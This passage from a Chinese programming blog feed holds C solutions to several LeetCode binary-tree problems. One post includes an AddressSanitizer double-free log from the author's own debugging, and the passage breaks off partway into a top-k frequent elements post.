    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/symmetric-tree/</p><p>这题是简单题，但是想了好久还是没什么思路，本来想用递归判断每个子树的对称性，但是题目的意思是整体的二叉树是对称的，不是指每个子树也是对称的。</p><p>因此判断对称，需要分别比较根节点的：</p><ul><li>左、右孩子节点值</li><li>左、右子树<strong>外侧</strong>节点值（即左孩子的左子树，右孩子的右子树）</li><li>左、右子树<strong>内侧</strong>节点值（即左孩子的右子树，右孩子的左子树）</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">struct</span> TreeNode* left, <span class="keyword">struct</span> TreeNode* right)</span> {</span><br><span class="line">    <span class="keyword">if</span>(left!=<span class="literal">NULL</span> &amp;&amp; right==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(left==<span class="literal">NULL</span> &amp;&amp; right!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(left==<span class="literal">NULL</span> &amp;&amp; right==<span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(left-&gt;val!=right-&gt;val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> out = compare(left-&gt;left, right-&gt;right);</span><br><span class="line">    <span class="type">bool</span> in = compare(left-&gt;right, right-&gt;left);</span><br><span class="line">    <span class="keyword">return</span> (out &amp;&amp; in);</span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isSymmetric</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">     <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> compare(root-&gt;left, root-&gt;right);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>翻转二叉树</title>
    <link href="/2024/02/24/%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2024/02/24/%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/invert-binary-tree/</p><p>我一开始的思路是使用层序遍历<strong>将每一层的节点倒序</strong>，但是发现若当前节点交换位置后，该节点所在的子树也随着该节点改变了位置，因此使用层序遍历无法实现。</p><p>正确的思路应该是<strong>递归</strong>，每次交换<strong>当前节点的两个子树</strong>位置就行了</p><blockquote><p>注意：NULL节点也需要参与翻转</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">invertTree</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">tmp</span>;</span></span><br><span class="line">    <span class="comment">//注意NULL节点也参与翻转</span></span><br><span class="line">    tmp = root-&gt;left;</span><br><span class="line">    root-&gt;left = root-&gt;right;</span><br><span class="line">    root-&gt;right = tmp;</span><br><span class="line"></span><br><span class="line">    invertTree(root-&gt;left);</span><br><span class="line">    invertTree(root-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树的最小深度</title>
    <link href="/2024/02/23/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%B0%8F%E6%B7%B1%E5%BA%A6/"/>
    <url>/2024/02/23/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%B0%8F%E6%B7%B1%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/minimum-depth-of-binary-tree/</p><p>这题乍一看跟<strong>二叉树的最大深度</strong>很像，但其实区别不小主要区别如下：</p><ul><li>当<strong>左右子树均为空</strong>时，才返回</li><li>深度为1时，需要判断是否<strong>只有一个子树</strong>还是<strong>只有一个根结点</strong></li></ul><p>代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">deep</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> depth)</span> {</span><br><span class="line">    <span class="type">int</span> dep1=<span class="number">1</span>,dep2=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span> &amp;&amp; root-&gt;right==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> depth;  <span class="comment">//左右子树为空则为叶结点，返回</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span>) <span class="comment">//只有右子树</span></span><br><span class="line">        dep2 = deep(root-&gt;right,depth+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;right == <span class="literal">NULL</span>) <span class="comment">//只有左子树</span></span><br><span class="line">        dep1 =  deep(root-&gt;left, depth+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        dep1 =  deep(root-&gt;left, depth+<span class="number">1</span>);</span><br><span class="line">        dep2 = deep(root-&gt;right,depth+<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(dep1==<span class="number">1</span>) <span class="comment">//当深度为1时，需要注意是只有一个根结点还是一个子树</span></span><br><span class="line">        <span class="keyword">return</span> dep2;</span><br><span class="line">    <span class="keyword">if</span>(dep2==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dep1;</span><br><span class="line">    <span class="keyword">return</span> dep1&lt;dep2?dep1:dep2;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> deep(root, <span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树的最大深度</title>
    <link href="/2024/02/23/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/"/>
    <url>/2024/02/23/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/maximum-depth-of-binary-tree/</p><p>这题可以使用二叉树的层序遍历计算深度（迭代），或者使用深度优先搜索（递归），我使用的就是递归法：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">deep</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> depth)</span> {</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    <span class="type">int</span> dep1 =  deep(root-&gt;left, depth+<span class="number">1</span>); <span class="comment">//左子树的深度</span></span><br><span class="line">    <span class="type">int</span> dep2 = deep(root-&gt;right,depth+<span class="number">1</span>); <span class="comment">//右子树的深度</span></span><br><span class="line">    <span class="keyword">return</span> dep1&gt;dep2?dep1:dep2;  <span class="comment">//返回更大的深度</span></span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="comment">//若树为空则返回0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> depth = deep(root,<span class="number">0</span>);  <span class="comment">//调用deep函数</span></span><br><span class="line">    <span class="keyword">return</span> depth;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>填充每个节点的下一个右侧节点指针</title>
    <link href="/2024/02/23/%E5%A1%AB%E5%85%85%E6%AF%8F%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E5%8F%B3%E4%BE%A7%E8%8A%82%E7%82%B9%E6%8C%87%E9%92%88/"/>
    <url>/2024/02/23/%E5%A1%AB%E5%85%85%E6%AF%8F%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E5%8F%B3%E4%BE%A7%E8%8A%82%E7%82%B9%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/populating-next-right-pointers-in-each-node/</p><p>一开始看到题目条件中有“树中节点的数量在<strong>[0,2<sup>12</sup>-1]</strong>范围内”，我一时没反应过来，觉得不能直接一次性分配这么大的空间，后面算了算发现节点数量不到<strong>5000</strong>，可以直接一次性分配。</p><p>这题跟之前的二叉树层序遍历是一样的思路，直接套模板：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> Node* <span class="title function_">connect</span><span class="params">(<span class="keyword">struct</span> Node* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">que</span>[5000];</span> <span class="comment">//队列</span></span><br><span class="line">    <span class="type">int</span> head=<span class="number">0</span>, rear=<span class="number">0</span>; <span class="comment">//队头/尾</span></span><br><span class="line">    que[rear++] = root;<span class="comment">//根结点入队</span></span><br><span class="line">    <span class="type">int</span> level=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(rear!=head) { <span class="comment">//队列不为空</span></span><br><span class="line">        <span class="type">int</span> start = head; <span class="comment">//记录当前队头位置</span></span><br><span class="line">        head = rear; <span class="comment">//出队</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = start; i&lt;head; i++) { <span class="comment">//注意这里的边界值start和head</span></span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">1</span>==head)</span><br><span class="line">                que[i]-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                que[i]-&gt;next = que[i+<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(que[i]-&gt;left) { <span class="comment">//由于是完全二叉树，所以有左子树一定有右子树</span></span><br><span class="line">                que[rear++] = que[i]-&gt;left; <span class="comment">//左子树入队</span></span><br><span class="line">                que[rear++] = que[i]-&gt;right; <span class="comment">//右子树入队</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        (level)++; <span class="comment">//当前层遍历结束，准备进入下一层</span></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>N叉树的层序遍历</title>
    <link href="/2024/02/22/N%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"/>
    <url>/2024/02/22/N%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/n-ary-tree-level-order-traversal/</p><p>这题与二叉树的层序遍历基本相同，直接在之前的代码上稍作修改。</p><p>运行默认的2个测试用例，通过了；直接提交发现报错：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==22==ERROR: AddressSanitizer: attempting double-free on 0x603000000100 in thread T0:</span><br><span class="line">    #0 0x7f28f87e7537 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:127</span><br><span class="line">    #2 0x7f28f7e17d8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)</span><br><span class="line">    #3 0x7f28f7e17e3f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x29e3f)</span><br><span class="line">0x603000000100 is located 0 bytes inside of 20-byte region [0x603000000100,0x603000000114)</span><br><span class="line">freed by thread T0 here:</span><br><span class="line">    #0 0x7f28f87e7537 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:127</span><br><span class="line">    #2 0x7f28f7e17d8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)</span><br><span class="line">previously allocated by thread T0 here:</span><br><span class="line">    #0 0x7f28f87e7887 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145</span><br><span class="line">    #3 0x7f28f7e17d8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)</span><br><span class="line">SUMMARY: AddressSanitizer: double-free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:127 in __interceptor_free</span><br><span class="line">==22==ABORTING</span><br></pre></td></tr></tbody></table></figure><p>搜了一下，上述报错原因是：<strong>这个错误提示是地址检测工具（AddressSanitizer）给出的。它指出了双重释放（double-free）的问题，意味着你试图释放已经被释放过的内存空间。</strong></p><p>然后发现LeetCode上有人提过这个问题，解决方案是<strong>初始化<code>*returnColumnSizes</code></strong>，下面是正确代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>** <span class="title function_">levelOrder</span><span class="params">(<span class="keyword">struct</span> Node* root, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    <span class="type">int</span>** res = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*<span class="number">1000</span>);</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>){</span><br><span class="line">        *returnColumnSizes = <span class="literal">NULL</span>; <span class="comment">//很重要！！！</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">que</span>[10000];</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> count[<span class="number">1000</span>]; <span class="comment">//统计每一层节点的个数</span></span><br><span class="line">    <span class="type">int</span> front=<span class="number">0</span>, rear=<span class="number">0</span>; <span class="comment">//队头，队尾</span></span><br><span class="line">    que[rear++] = root; <span class="comment">//根结点入队</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(front!=rear) {</span><br><span class="line">        count[*returnSize] = rear-front; <span class="comment">//当前层所包含的节点个数</span></span><br><span class="line">        <span class="type">int</span> start = front;  <span class="comment">//当前层的起始节点下标</span></span><br><span class="line">        front = rear; <span class="comment">//当前层的最后一个节点下标</span></span><br><span class="line">        res[*returnSize] = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*count[*returnSize]); <span class="comment">//分配空间</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;front; i++) {</span><br><span class="line">            res[*returnSize][i-start] = que[i]-&gt;val;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;que[i]-&gt;numChildren; j++) { <span class="comment">//遍历当前节点的所有子结点</span></span><br><span class="line">                que[rear++] = que[i]-&gt;children[j];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        (*returnSize)++; <span class="comment">//层数增加</span></span><br><span class="line">    }</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(*returnSize));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;*returnSize; i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = count[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树的层序遍历</title>
    <link href="/2024/02/19/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"/>
    <url>/2024/02/19/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/binary-tree-level-order-traversal/</p><p>层序遍历需要借助<strong>队列</strong>实现，首先入队根结点，然后出队同时将其<strong>左子树</strong>和<strong>右子树</strong>入队，接着出队，同时将当前出队结点的左右子树入队，继续出队，重复之前的操作。</p><p>这题的难点在于需要统计每一层的节点数，这里用队尾与队头之差表示。</p><ul><li>先定义必要的变量</li><li>若二叉树不为空，则将根节点入队</li><li><code>while</code>循环判断队列是否为空，嵌套以下内容：<ul><li>计算当前队列中的节点个数</li><li>记录当前队头位置，然后队头节点出队</li><li>使用<code>for</code>循环将该层节点值加入结果数组<code>res</code>中，注意循环的边界判断（当前层的节点），然后将下一层的节点入队</li><li><code>for</code>循环结束后注意增加层数<code>*returnSize</code></li></ul></li><li>退出<code>while</code>循环后，为<code>*returnColumnSizes</code>数组分配空间，然后根据记录的不同层的节点个数，为该数组赋值</li><li>返回结果数组<code>res</code></li></ul><blockquote><p>这里的<code>int** returnColumnSizes</code>参数我参考了几篇文章，我的理解是：</p><p>由于题目要求<code>*returnColumnSizes</code>数组需要使用<code>malloc</code>分配空间，说明了<strong>数组的首地址</strong>发生了改变，所以传递的参数是<strong>指向该数组地址的指针</strong>，即<strong>二级指针</strong>。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>** <span class="title function_">levelOrder</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span> {</span><br><span class="line">    <span class="type">int</span>** res = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*<span class="number">2000</span>); <span class="comment">//结果数组</span></span><br><span class="line">    *returnSize=<span class="number">0</span>;    </span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) { <span class="comment">//若二叉树为空，则返回NULL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>* <span class="title">que</span>[2000];</span> <span class="comment">//队列</span></span><br><span class="line">    <span class="type">int</span> count[<span class="number">2000</span>]; <span class="comment">//每层节点数</span></span><br><span class="line">    <span class="type">int</span> head=<span class="number">0</span>, rear=<span class="number">0</span>; <span class="comment">//队头,队尾</span></span><br><span class="line">    que[rear++] = root;<span class="comment">//根结点入队</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(rear!=head) { <span class="comment">//队列不为空</span></span><br><span class="line">        res[*returnSize] = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(rear-head)); <span class="comment">//用于记录当前这层的元素</span></span><br><span class="line">        count[(*returnSize)] = rear-head; <span class="comment">//记录该层节点个数</span></span><br><span class="line">        <span class="type">int</span> start = head; <span class="comment">//记录当前队头位置</span></span><br><span class="line">        head = rear; <span class="comment">//出队</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = start; i&lt;head; i++) { <span class="comment">//注意这里的边界值start和head</span></span><br><span class="line">            res[*returnSize][i-start] = que[i]-&gt;val;</span><br><span class="line">            <span class="keyword">if</span>(que[i]-&gt;left) </span><br><span class="line">                que[rear++] = que[i]-&gt;left; <span class="comment">//左子树入队</span></span><br><span class="line">            <span class="keyword">if</span>(que[i]-&gt;right) </span><br><span class="line">                que[rear++] = que[i]-&gt;right; <span class="comment">//右子树入队</span></span><br><span class="line">        }</span><br><span class="line">        (*returnSize)++; <span class="comment">//当前层遍历结束，准备进入下一层</span></span><br><span class="line">    }</span><br><span class="line">    *returnColumnSizes = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(*returnSize)); <span class="comment">//分配空间用于存放每层节点个数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;*returnSize; i++) {</span><br><span class="line">        (*returnColumnSizes)[i] = count[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前k个高频元素</title>
    <link href="/2024/02/17/%E5%89%8Dk%E4%B8%AA%E9%AB%98%E9%A2%91%E5%85%83%E7%B4%A0/"/>
    <url>/2024/02/17/%E5%89%8Dk%E4%B8%AA%E9%AB%98%E9%A2%91%E5%85%83%E7%B4%A0/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/top-k-frequent-elements/</p><p>代码随想录中的思路是使用优先队列构建小顶堆，每次弹出最小频率的元素，剩余的k个元素就是前k个高频元素，用C++实现比较方便，但是使用C语言就比较繁琐。</p><p>使用C语言实现则利用<strong>快速排序</strong>实现，思路如下：</p><ul><li><p>先定义一个结构体包括<strong>元素值</strong>和<strong>元素频率</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">map</span> {</span></span><br><span class="line">    <span class="type">int</span> ele; <span class="comment">//元素值</span></span><br><span class="line">    <span class="type">int</span> nu; <span class="comment">//记录次数</span></span><br><span class="line">} Map;</span><br></pre></td></tr></tbody></table></figure></li><li><p>声明<code>cmp</code>和<code>cmps</code>函数，作为<code>qsort</code>的参数，实现升/降序排序（通过<code>a</code>、<code>b</code>的顺序判断）</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a,<span class="type">const</span> <span class="type">void</span> *b)</span> {</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">int</span>*)a-*(<span class="type">int</span>*)b;  <span class="comment">//升序</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmps</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a,<span class="type">const</span> <span class="type">void</span>* b)</span>{</span><br><span class="line">    <span class="keyword">return</span> (*(Map*)b).nu - (*(Map*)a).nu; <span class="comment">//比较两个元素的频率（降序）</span></span><br><span 